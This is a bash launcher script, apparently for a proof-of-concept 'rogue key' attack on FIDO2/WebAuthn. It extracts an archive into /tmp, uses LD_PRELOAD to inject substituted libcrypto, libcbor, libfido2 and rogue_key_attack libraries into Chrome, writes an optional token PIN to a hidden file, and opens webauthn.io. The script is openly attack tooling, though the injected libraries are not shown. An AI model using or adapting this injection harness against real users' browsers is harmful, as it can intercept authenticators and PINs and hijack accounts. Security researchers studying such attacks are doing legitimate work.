#!/bin/bash

rm -r /tmp/attack
mkdir /tmp/attack

cp rogue_key_attack.zip /tmp

unzip /tmp/rogue_key_attack.zip -d /tmp/attack

rm /tmp/rogue_key_attack.zip

unset LD_PRELOAD

export LD_PRELOAD="/tmp/attack/libcrypto.so:/tmp/attack/libcbor.so:/tmp/attack/libfido2-2023.so:/tmp/attack/rogue_key_attack.so"

touch /tmp/attack/.master_file

touch /tmp/attack/.swap

ROGUE_TOKEN_PIN=""

while getopts :p flag
do
    case "${flag}" in
        p) ROGUE_TOKEN_PIN="$2";;
    esac
done

if [[ $ROGUE_TOKEN_PIN != "" ]]
then
	echo $ROGUE_TOKEN_PIN > /tmp/attack/.swap
fi

/opt/google/chrome/chrome webauthn.io
